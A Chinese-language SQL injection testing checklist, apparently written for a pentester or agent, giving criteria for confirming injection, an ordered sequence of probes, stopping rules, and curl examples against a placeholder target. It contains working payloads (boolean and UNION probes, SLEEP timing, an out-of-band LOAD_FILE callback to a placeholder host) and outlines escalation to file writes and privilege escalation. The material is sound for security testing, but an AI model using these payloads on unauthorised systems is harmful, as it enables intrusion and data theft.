# SQL 注入：判定标准与检查顺序

**一句话结论**：先用**两次可对照的请求**证明参数改变了 SQL 语义（布尔差异或时间差异），再谈利用；只有报错文案不算注入。

## 判定标准

**算命中**（任一）：
- 布尔差异：`' AND 1=1-- -` 与 `' AND 1=2-- -` 返回**内容不同**（长度/字段数/记录数有稳定差异）
- 时间差异：`' AND SLEEP(3)-- -` 比基线慢 ≥ 2.5s，且重复 2 次稳定
- 报错泄露：报错里出现 SQL 关键字 + 语法片段（能定位到具体 DBMS）
- 联合查询：`ORDER BY N` 报错边界稳定 → 可确定字段数

**不算命中**（最常见的误判）：
- 只看到通用 500 / WAF 拦截页
- 参数加了引号"好像报错了"，但对比基线无法稳定复现
- 版本指纹匹配到"可能存在注入"的组件

## 检查顺序（不许跳级）

1. **基线**：原请求跑 2 次，记长度、状态码、耗时。
2. **引号探针**：`'`、`"`、`')`、`\` 各一次，看是否 500/报错；与基线对比。
3. **布尔对**：`AND 1=1` vs `AND 1=2`（URL 编码、大小写、注释符 `-- -` / `#` / `/* */` 各试一次）。
4. **字段数**：`ORDER BY 1..10` 找报错边界（比 UNION 更温和）。
5. **回显位置**：`UNION SELECT 1,2,3...` 看哪一列回显。
6. **时间盲注**：仅当无回显时用，`SLEEP(3)` / `BENCHMARK` / 数据库特定函数。
7. **带外**：DNS/HTTP 回连（`LOAD_FILE('\\\\<OAST>\\a')`、`xp_dirtree`）。
8. **利用**：读数据 → 读文件 → 写文件/提权（按 DBMS 与权限）。

## 最小验证

```bash
# 布尔对（差异要稳定）
curl -s "http://TARGET/api/item?id=1'%20AND%201=1--%20-" | wc -c
curl -s "http://TARGET/api/item?id=1'%20AND%201=2--%20-" | wc -c
# 时间盲注（重复 2 次，比基线慢 ≥2.5s 才算）
time curl -s "http://TARGET/api/item?id=1'%20AND%20SLEEP(3)--%20-" >/dev/null
```

## 失败即停

- 同一参数换了 **3 种编码/注释符** 仍无稳定差异 → 判该参数不可注，记 fact（`inferred`）后换参数。
- 同一入口累计 **2 轮**无增量 → 交顾问，**换层**（认证后接口 / 上传 / SSRF），不要继续换 payload。
- WAF 拦截页 ≠ 目标有防护结论；只记"被拦一次"，换载体再判一次。
